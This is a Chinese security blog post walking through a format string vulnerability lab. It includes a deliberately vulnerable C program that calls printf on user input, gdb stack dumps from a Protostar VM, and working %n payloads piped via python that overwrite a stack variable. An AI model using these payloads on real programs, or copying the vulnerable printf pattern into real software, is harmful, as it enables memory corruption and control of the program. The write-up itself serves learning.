<!DOCTYPE html>
<html>


    <head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>格式化串漏洞</title>
<meta name="description" content="A blog about programming and network security">

<link rel="profile" href="http://gmpg.org/xfn/11" />
<! -- link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bbbbootstrap.min.css"-- >
<link rel="stylesheet" href="../../../../../css/my_code.css">
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
<link rel="stylesheet" href="/css/highlightjs.piperita.css">

<!-- Favicons generated at http://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
<link rel="manifest" href="/favicons/manifest.json">
<link rel="shortcut icon" href="/favicons/favicon.ico">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
<meta name="msapplication-config" content="/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">





</head>


    <body>

    <nav id="my-menu">
  <div>
    <p>quanyechavshuo</p>

    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <!--http://fontawesome.io/icons/ -->
    <br>
    <center>
    <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html" target="_top"><font color="red"> book</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
    <br>
    <br>
    <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
    </center>
    <p class="links">
  <a href="http://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
  <a href="https://github.com/quanyechavshuo" target="_new"><i class="fa fa-github-alt"></i></a>
  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
</p>

  </div>
</nav>
<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>



    <div class="page-content">
      <div class="wrap">
      

<div class="container-fluid single">
  <div class="row">

    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
      

      <h1 class="header" itemprop="name">格式化串漏洞</h1>

      <div class="author">
        <small><i>
          
          on <span itemprop="datePublished" content="2014-08-28">June 26, 2016</span>
           under 二进制
        </i></small>
      </div>

      <div class="read-time">
        <small>
          2 minute read
        </small>
      </div>

      <div class="content-panel content">

        

        <span itemprop="articleBody"><h3 id="x01-">0x01 结论知识</h3>

<p>1&gt;printf(“%x”)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>printf("%x"):未进入printf函数前,第一个栈里的值
</code></pre>
</div>

<p>2&gt;printf(“%8x”)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>printf("%8x"):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
</code></pre>
</div>

<p>3&gt;<code class="highlighter-rouge">printf("%3\$x")</code></p>

<div class="highlighter-rouge"><pre class="highlight"><code>printf("%3\$x"):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")来达到同样的目的)
宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值
</code></pre>
</div>

<p>4&gt;<code class="highlighter-rouge">printf("%3\$n")</code></p>

<div class="highlighter-rouge"><pre class="highlight"><code>printf("AAAA%3\$n"):将4(4个A)写入第三个栈里的值指向的内存空间,也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
</code></pre>
</div>

<p>0x02 原理理解</p>

<h4 id="refer">1&gt;refer</h4>
<div class="highlighter-rouge"><pre class="highlight"><code>http://drops.wooyun.org/binary/7714
http://drops.wooyun.org/papers/9426
</code></pre>
</div>

<h4 id="c">2&gt;c代码</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>假设文件名为md.c
------------md.c----------------
#include &lt;stdio.h&gt;
int main(void)
{ 
    int flag = 0;
    int *p = &amp;flag; 
    char a[100];
    scanf("%s",a);
    printf(a);

    if(flag == 2000)
    {
        printf("good!!\n");
    }

    return 0;
}
-------------end----------------
</code></pre>
</div>

<h4 id="section">栈空间</h4>

<p><a href="http://www.cplusplus.com/reference/cstdio/printf/">printf函数</a><br />
int printf ( const char * format, …  )</p>

<div class="highlighter-rouge"><pre class="highlight"><code>第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨

一般在栈空间里,形如"%8xaaa%8d%n"的字符串参数会存放在某个地方,而在栈中printf的第一个参数char *format一般是这个字符串("%8xaaa%8d%n")的地址,这个栈单元下面(高地址)的栈单元中存放的值是被cpu当作的后续参数,eg:

printf("%8xaaa%8d%n")在栈中的数据如下:
    printf_ebp(printf函数帧中的第一句push的ebp)
    printf_retn(printf函数的返回地址)
    addr_of_"%8xaaa%8d%n"(栈中第一个参数)
    0x11111111(将成为栈中第二个参数)
    0x22222222(将成为栈中第三个参数)
    0x33333333(将成为栈中第三个参数)
    ...(将成为栈中第四个参数)
    ...(...)

上面的printf调用后将产生这样的效果:
    1.在屏幕上打印出:11111111aaa572662306(其中十六进制0x22222222对应十进制572662306),也即从printf的第二个参数开始打印或写入到对应地址
    2.向地址为0x33333333的内存中写入19(8+3+8=19)

后来发现这是windows中的情况,kalix64中栈中第一个参数的位置存放的不再是字符串"%8xaaa%8d%n"地址,而是字符串本身

上面的2中的c代码对应的栈中分配的情况如下图format所示:
</code></pre>
</div>
<p>图format
<img src="https://raw.githubusercontent.com/xinghuacai/pic/master/format.png" /></p>

<div class="highlighter-rouge"><pre class="highlight"><code>后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现"写"

因此,这个实验更适合在linux下进行,且kalix64中的情况与http://drops.wooyun.org/papers/9426中的情况不一样,将md.c复制到protostar(32位)系统中进行实验

scp /root/桌面/md.c user@192.168.3.221:/tmp
pass:user
cd /tmp
gcc -g -o md md.c
gdb md
disas /m main
------output:-------
8           printf(a);
0x08048482 &lt;main+46&gt;:   lea    0x14(%esp),%eax
0x08048486 &lt;main+50&gt;:   mov    %eax,(%esp)
0x08048489 &lt;main+53&gt;:   call   0x8048364 &lt;printf@plt&gt;
---------end--------
b*main+53
r
input:AAAA%x.%x.%x
x/20x $esp
-----output:------
0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
------end---------
根据上面windows下od跟踪绘出的图容易知道,0xbffff6e0处存放的为字符串"AAAA%x.%x.%x"的内存地址,也即0xbffff6e0处存放的为printf的第一个参数,0xbffff6e4为第二个参数,以此下推

按照上面图format的理解易知程序运行完后将在屏幕上打印出:AAAAbffff6f4.080481dc.bffff778(从printf的第二个参数开始打印)

如果scanf输入的是:AAAA%x.%x.%x.%x.%x,那么最后一个输出的地址将是41414141,因为printf的第六个参数是41414141,从第二个参数到第六个参数共5个栈单元大小

再次分析此linux系统(protostar)中的变量在栈中存放的具体情况,如下
disas main
--------output:--------
   │0x8048454 &lt;main&gt;                push   %ebp                                                                                                                                                                   │
   │0x8048455 &lt;main+1&gt;              mov    %esp,%ebp                                                                                                                                                              │
   │0x8048457 &lt;main+3&gt;              and    $0xfffffff0,%esp                                                                                                                                                       │
   │0x804845a &lt;main+6&gt;              add    $0xffffff80,%esp                                                                                                                                                       │
   │0x804845d &lt;main+9&gt;              movl   $0x0,0x78(%esp)                                                                                                                                                        │
   │0x8048465 &lt;main+17&gt;             lea    0x78(%esp),%eax                                                                                                                                                        │
   │0x8048469 &lt;main+21&gt;             mov    %eax,0x7c(%esp)                                                                                                                                                        │
   │0x804846d &lt;main+25&gt;             mov    $0x8048570,%eax                                                                                                                                                        │
   │0x8048472 &lt;main+30&gt;             lea    0x14(%esp),%edx                                                                                                                                                        │
   │0x8048476 &lt;main+34&gt;             mov    %edx,0x4(%esp)                                                                                                                                                         │
   │0x804847a &lt;main+38&gt;             mov    %eax,(%esp)                                                                                                                                                            │
   │0x804847d &lt;main+41&gt;             call   0x8048374 &lt;__isoc99_scanf@plt&gt;                                                                                                                                         │
   │0x8048482 &lt;main+46&gt;             lea    0x14(%esp),%eax                                                                                                                                                        │
   │0x8048486 &lt;main+50&gt;             mov    %eax,(%esp)                                                                                                                                                            │
B+&gt;│0x8048489 &lt;main+53&gt;             call   0x8048364 &lt;printf@plt&gt; 
-----------end---------
main+9处为将flag(flag为0)存放到esp+0x78里面,也即esp+0x78处存放flag
main+21处为将esp+0x78的值(flag所在的地址)放入到esp+0x7c中,也即flag+7c存放flag的地址
形如:

        --------
addr1      0         addr1=esp+0x78,flag被赋值为0
        --------
         addr1       esp+0x7c处存放p,p被赋值为flag的地址
        --------

flag和p在栈中存放的位置情况与windows中的实验完全相反,linux中是flag存放在p的上面,而win7x64中是flag存放在p的下面

在main+21处下断,用来查看esp+0x78的值,也即addr1的值,然后addr1+4即为p存放的地址,算出p存放的地址与printf第二个参数的地址相差多少,就可以知道如何安排format(%n的合适安排)来达到改变p指向的内容的值的目的,也即将一个值写入[p],相当于intel风格汇编语句mov [p],something

q
gdb md
disas main
-------------output:--------------
0x08048454 &lt;main+0&gt;:    push   %ebp
0x08048455 &lt;main+1&gt;:    mov    %esp,%ebp
0x08048457 &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x0804845a &lt;main+6&gt;:    add    $0xffffff80,%esp
0x0804845d &lt;main+9&gt;:    movl   $0x0,0x78(%esp)
0x08048465 &lt;main+17&gt;:   lea    0x78(%esp),%eax
0x08048469 &lt;main+21&gt;:   mov    %eax,0x7c(%esp)
---------------end----------------
b*main+21
r
p/x $eax
-----output:-------
$3 = 0xbffff758,也即0xbffff758处存放的为flag,addr1=0xbfff758
-------end---------
disas main
-------------output:----------------
0x0804847d &lt;main+41&gt;:   call   0x8048374 &lt;__isoc99_scanf@plt&gt;
0x08048482 &lt;main+46&gt;:   lea    0x14(%esp),%eax
0x08048486 &lt;main+50&gt;:   mov    %eax,(%esp)
0x08048489 &lt;main+53&gt;:   call   0x8048364 &lt;printf@plt&gt;
---------------end------------------
b*main+53
c
input:AAAA%x.%x.%x
x/40x $esp
------------output:-----------------
0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
0xbffff730:     0xb7ff1040      0x08049668      0xbffff768      0x080484d9
0xbffff740:     0xb7fd8304      0xb7fd7ff4      0x080484c0      0xbffff768
0xbffff750:     0xb7ec6365      0xb7ff1040      0x00000000      0xbffff758
0xbffff760:     0x080484c0      0x00000000      0xbffff7e8      0xb7eadc76
0xbffff770:     0x00000001      0xbffff814      0xbffff81c      0xb7fe1848
---------------end------------------
同样可以看到0xbffff758处存放的0即为flag的值,而0xbfff75c处存放的为p,要实现将0xbffff75c处的0xbffff758指向的内容修改为2000,也即要实现0xbffff75c处,[0xbffff758]=2000

0xbffff75c与printf的第二个参数的地址0xbffff6e4相差0xbffff75c-0xbffff6e4=0x78=30个栈单元大小,也即flag为printf的第31个参数,p为printf的第32个参数

所以要将第32个参数指向的内容修改为2000,这样就可以实现将第31个参数修改为2000

构造"%x"*30+%n,其中前面30个%x中要输出2000个长度,可以通过修改宽度输出大小实现,eg.%1768x+"%x"*29+%n(1768+29*8=2000)

第六个参数为开始存放scanf由终端输入的格式化字符串,第32个参数的数据为重要的不能被scanf由终端输入覆盖的位置,所以输入最多可以输入第6到第31个参数所占的空间大小,共32-6+1=27个栈单元大小=27*4=108个字节

如果由scanf从终端输入超过108个字节的格式化字符串,第109到112个字节将覆盖printf的第32个参数,这样printf执行完以后会将2000写入到109-112个字节被覆盖的值的地址空间中,所以如果输入超过108个字节也可以,但是必须保证输入的第109-112个字节为printf第32个参数原本的值,如果直接将printf第31个参数覆盖成2000,会在printf执行完以后被%n的作用改写成其他值,所以直接在printf的第31个参数位置输入2000是不行的

最好的办法是输入长度不超过108个字节,如
%1768x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n

但是发现这样不会打印出good,gdb尝试打印发现是在printf打印的时候,如果%x对应的要打印的最高位为0,将被省略去这个"0",所以改成下面的形式,强制8位对应每个%x

%1768x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n(93个字节&lt;108个字节)
成功打印出good,实现了将flag修改为2000,这样在aslr开启的时候同样有效,因为这里用的是相对偏移

在aslr没有开启时,为了进一步缩短scanf由终端输入的格式化字符串长度的大小(小于108即可),达到精确打击,直接改写printf的第32个参数指向的内存空间的值(也即实现修改flag),可以这样做:

在scanf由终端输入的格式化字符串的开头写上printf的第32个参数的值,也即p的值,也即flag存放的地址
scanf由终端输入:"0xbffff758"(对应printf第6个参数)+%8x(读第2个参数)+%8x(读第3个参数)+%8x(读第4个参数)+%1972x(读第5个参数)+%n(写进第6个参数指向的内存空间)
也即'\x58\xf7\xff\xbf'%8x%8x%8x%1972x%n
其中4+8*3+1972=2000
但是0xbffff758是gdb调试时候的第32个参数的值,与md单独运行时并不相同,需要找出md直接运行时的printf的第32个参数的值替换即可

scanf由终端输入%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAA%x(31个%x)

最后第31个AA%x处对应输出为:AAbffff788,也即实际运行时printf的第32个参数为0xbffff788

也可以通过http://drops.wooyun.org/papers/9426中查看printf第2个参数的值+(第32个参数与第2个参数相减的差)的方法来计算出第32个参数的大小

构造:'\x88\xf7\xff\xbf'%8x%8x%8x%1972x%n
python -c "print '\x88\xf7\xff\xbf'+'%8x%8x%8x%1972x%n'" | ./md
成功修改了flag的值为2000,打印出了good!

或者更短一些，利用%5\$n(直接参数访问)直接写入到printf第六个参数中
也即：
'\x88\xf7\xff\xbf'%1996x%5\$n

python -c "print '\x88\xf7\xff\xbf'+'%1996x%5\$n'" | ./md
成功修改了flag的值为2000,打印出了good!



</code></pre>
</div>

</span>

        


        
        <div class="tags">
          <small>
          <i class="fa fa-tags"></i>
            格式化串, format
          </small>
        </div>
        

      </div>

      
      <div class="content-panel feedback">
        I <i class="fa fa-heart"></i> feedback.<br />
        Let me know what you think of this article on twitter <a href="http://www.twitter.com/quanyechavshuo">@quanyechavshuo</a> or leave a comment below!
      </div>
      

      
      <div class="content-panel comments">
        <div id="disqus_thread">
          <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
          <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </div>
      </div>
      

      

    </div>

  </div>

</div>


<script type="text/javascript">
/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
function disqus_config() { this.experiment.enable_scroll_container = true; }
var disqus_shortname = "quanyechavshuo"; // required: replace example with your forum shortname
/* * * DON'T EDIT BELOW THIS LINE * * */
(function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>


      </div>
    </div>

    <div class="footer clearfix">
  <div class="col-md-12">
    for better experience please install font 文泉驿等宽正黑
  </div>
</div>

<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/xinghuacai" target="_top"> <font color="white">papers</font></a></div>
<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
<div class="my-archive"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
<div class="my-categories"><i class="fa fa-tags" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">categories</font></a></div>


<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
<script src="/js/jquery.mmenu.min.all.js"></script>
<script src="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
   $(document).ready(function() {
      $("#my-menu").mmenu().on( "closed.mm", function() {
            $(".menu-button").show();
         });
      $(".menu-button").click(function() {
        $(".menu-button").hide();
        $("#my-menu").trigger("open.mm");
      });
   });
</script>






    </body>
</html>
